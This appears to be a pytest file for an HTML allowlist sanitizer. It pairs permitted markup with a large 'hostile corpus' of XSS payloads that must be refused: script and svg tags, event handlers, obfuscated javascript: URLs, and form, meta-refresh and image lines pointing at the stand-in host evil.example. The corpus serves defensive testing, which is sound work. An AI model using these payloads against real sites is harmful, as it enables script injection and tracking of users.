"""The HTML allowlist of `html` steps: what passes, and a hostile corpus in
which every entry must be refused. No database."""

import base64

import pytest

from app.core.paths import ASSETS_PATH
from app.welcome_flow.html import MAX_DATA_IMAGE_BYTES, check_html

ASSET = "0197a1b2-c3d4-7e5f-8a9b-0c1d2e3f4a5b"
RLO = chr(0x202E)  # right-to-left override
PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 16
OWN_IMAGE = f"{ASSETS_PATH}/{ASSET}"


def data_uri(raw: bytes, kind: str = "png") -> str:
    return f"data:image/{kind};base64,{base64.b64encode(raw).decode()}"


ALLOWED = [
    "<p>Hola <strong>mundo</strong></p>",
    "<h1 class='a' id='b' lang='es' dir='ltr' title='t' role='note'>Título</h1>",
    "<ul><li>uno</li><li>dos</li></ul><ol start='3' reversed><li>x</li></ol>",
    (
        "<table><caption>c</caption><thead><tr><th scope='col'>a</th></tr></thead>"
        "<tbody><tr><td colspan='2' rowspan='1'>b</td></tr></tbody></table>"
    ),
    "<details open><summary>más</summary><p>detalle</p></details>",
    "<P CLASS='Mixed'>Mixed case tags are lower-cased by the parser</P>",
    "<a href='https://example.org/a?b=c#d'>enlace</a>",
    f"<img src='{OWN_IMAGE}' alt='foto' width='100' height='50'>",
    f"<img src='{OWN_IMAGE}/thumb' alt=''>",
    f"<img src='{data_uri(PNG)}' alt='pixel'>",
    "<div aria-label='x' aria-hidden='true'><br><hr></div>",
    "<p>5 &lt; 6 &amp;&amp; 7 &gt; 3 &lt;script&gt;</p>",
    "<p>caf&eacute; &#233; &#x1F600;</p>",
    "<code>a &lt; b</code>",
    "Texto sin etiquetas",
]


@pytest.mark.parametrize("html", ALLOWED)
def test_allowed_markup_passes(html: str) -> None:
    assert check_html(html) is None


HOSTILE = {
    # tags off the list, in every spelling
    "script": "<script>alert(1)</script>",
    "script mixed case": "<ScRiPt>alert(1)</sCrIpT>",
    "script with slash": "<script/src=https://evil.example/x.js></script>",
    "closing only": "</script>",
    "style": "<style>body{background:url(https://evil.example)}</style>",
    "iframe": "<iframe src='https://evil.example'></iframe>",
    "object": "<object data='x.swf'></object>",
    "embed": "<embed src='x'>",
    "form": "<form action='https://evil.example'><input name=a></form>",
    "input": "<input type=text>",
    "button": "<button formaction='https://evil.example'>x</button>",
    "meta refresh": "<meta http-equiv='refresh' content='0;url=https://evil.example'>",
    "link": "<link rel=stylesheet href=https://evil.example/x.css>",
    "base": "<base href='https://evil.example/'>",
    "video": "<video src=x onerror=alert(1)>",
    "audio": "<audio src=x></audio>",
    "svg": "<svg onload=alert(1)></svg>",
    "svg script": "<svg><script>alert(1)</script></svg>",
    "svg use": "<svg><use href='data:image/svg+xml;base64,PHN2Zz48L3N2Zz4='/></svg>",
    "math": "<math><mi xlink:href='javascript:alert(1)'>x</mi></math>",
    "template": "<template><img src=x></template>",
    "noscript": "<noscript><p title='</noscript><img src=x onerror=alert(1)>'>",
    "textarea": "<textarea><img src=x></textarea>",
    "title": "<title>x</title>",
    "xmp": "<xmp><img src=x></xmp>",
    "marquee": "<marquee>x</marquee>",
    "unknown tag": "<made-up>x</made-up>",
    "tag that breaks out of an attribute": "<a title='<script>'>x</a>",
    "nested tag trick": "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "slash instead of space": "<img/src=x/onerror=alert(1)>",
    "unterminated tag": "<p>x</p><script",
    "newline in tag name": "<script\n>alert(1)</script>",
    # attributes off the list
    "onerror": f"<img src='{OWN_IMAGE}' onerror='alert(1)'>",
    "onclick": "<p onclick='alert(1)'>x</p>",
    "onload uppercase": "<p ONLOAD='alert(1)'>x</p>",
    "onfocus autofocus": "<p onfocus=alert(1) autofocus tabindex=0>x</p>",
    "style attribute": "<p style='background:url(https://evil.example)'>x</p>",
    "data attribute": "<p data-track='1'>x</p>",
    "srcdoc": "<p srcdoc='<script>alert(1)</script>'>x</p>",
    "formaction": "<p formaction='https://evil.example'>x</p>",
    "target": "<a href='https://example.org' target='_top'>x</a>",
    "rel": "<a href='https://example.org' rel='opener'>x</a>",
    "srcset": f"<img srcset='https://evil.example/a.png 1x' src='{OWN_IMAGE}'>",
    "tabindex": "<p tabindex='0'>x</p>",
    "contenteditable": "<p contenteditable>x</p>",
    "xmlns": "<div xmlns='http://www.w3.org/1999/xhtml'>x</div>",
    "aria lookalike": "<p aria_label='x'>x</p>",
    "href on div": "<div href='https://example.org'>x</div>",
    "src on a": "<a src='https://example.org'>x</a>",
    "second href is hostile": (
        "<a href='https://ok.example' href='javascript:alert(1)'>x</a>"
    ),
    # link schemes and spellings
    "javascript href": "<a href='javascript:alert(1)'>x</a>",
    "javascript mixed case": "<a href='JaVaScRiPt:alert(1)'>x</a>",
    "javascript with tab": "<a href='java\tscript:alert(1)'>x</a>",
    "javascript with newline": "<a href='java&#10;script:alert(1)'>x</a>",
    "javascript numeric entities": "<a href='&#106;avascript:alert(1)'>x</a>",
    "javascript hex entities": "<a href='&#x6A;&#x61;vascript:alert(1)'>x</a>",
    "javascript named colon": "<a href='javascript&colon;alert(1)'>x</a>",
    "leading space": "<a href=' https://example.org'>x</a>",
    "leading control char": "<a href='&#1;javascript:alert(1)'>x</a>",
    "http href": "<a href='http://example.org'>x</a>",
    "data href": "<a href='data:text/html,%3Cscript%3Ealert(1)%3C/script%3E'>x</a>",
    "vbscript": "<a href='vbscript:msgbox(1)'>x</a>",
    "protocol relative": "<a href='//evil.example'>x</a>",
    "relative href": "<a href='/docs/page'>x</a>",
    "fragment href": "<a href='#top'>x</a>",
    "mailto": "<a href='mailto:a@b.c'>x</a>",
    "empty href": "<a href=''>x</a>",
    "valueless href": "<a href>x</a>",
    "credentials in https url": "<a href='https://user:pass@example.org'>x</a>",
    "backslash host": "<a href='https:\\\\evil.example'>x</a>",
    # images
    "external image": "<img src='https://tracker.example/p.gif'>",
    "http image": "<img src='http://tracker.example/p.gif'>",
    "protocol relative image": "<img src='//tracker.example/p.gif'>",
    "javascript image": "<img src='javascript:alert(1)'>",
    "svg data image": "<img src='data:image/svg+xml;base64,PHN2Zz48L3N2Zz4='>",
    "html data image": "<img src='data:text/html;base64,PHNjcmlwdD4='>",
    "data image not base64": "<img src='data:image/png,abc'>",
    "data image bad base64": "<img src='data:image/png;base64,@@@@'>",
    "data image wrong magic": f"<img src='{data_uri(b'<svg onload=alert(1)>')}'>",
    "data image too big": (
        f"<img src='{data_uri(PNG + b'\x00' * MAX_DATA_IMAGE_BYTES)}'>"
    ),
    "webp that is not webp": f"<img src='{data_uri(b'RIFF' + b'\x00' * 20, 'webp')}'>",
    "asset path with traversal": f"<img src='{ASSETS_PATH}/../{ASSET}'>",
    "asset path with query": f"<img src='{OWN_IMAGE}?x=https://evil.example'>",
    "asset id upper case": f"<img src='{ASSETS_PATH}/{ASSET.upper()}'>",
    "image without src value": "<img src>",
    # comments, declarations, instructions, CDATA
    "comment": "<!-- hi -->",
    "conditional comment": "<!--[if IE]><script>alert(1)</script><![endif]-->",
    "comment hiding a tag": "<!--><script>alert(1)</script>-->",
    "doctype": "<!DOCTYPE html><p>x</p>",
    "cdata": "<![CDATA[<script>alert(1)</script>]]>",
    "processing instruction": "<?xml version='1.0'?><p>x</p>",
    "bogus comment": "<!x><p>y</p>",
    "bogus end tag comment": "<p>y</p></ x>",
    # characters
    "nul byte": "<p>a\x00b</p>",
    "control character": "<p>a\x07b</p>",
    "lone surrogate": "<p>a\ud800b</p>",
    # structure
    "very deep nesting": "<div>" * 200,
    "deep nesting with closers missing": "<span><b>" * 120,
}


@pytest.mark.parametrize("html", HOSTILE.values(), ids=list(HOSTILE))
def test_every_hostile_input_is_refused(html: str) -> None:
    assert check_html(html) is not None


def test_the_offender_is_named() -> None:
    assert check_html("<p>ok</p><svg></svg>") == "the tag <svg>"
    assert check_html("<p onclick='x'>a</p>") == "the attribute onclick on <p>"
    assert check_html("<p data-x='1'>a</p>") == "the attribute data-x on <p>"
    assert check_html("<p>a</p></script>") == "the closing tag </script>"


def test_what_is_shown_back_never_carries_attacker_text() -> None:
    what = check_html(f"<p x{RLO}<script>='1'>a</p>")
    assert what is not None
    assert RLO not in what


def test_the_whole_field_is_refused_when_one_part_is_bad() -> None:
    assert check_html("<p>fine</p>" * 50 + "<iframe></iframe>") == "the tag <iframe>"
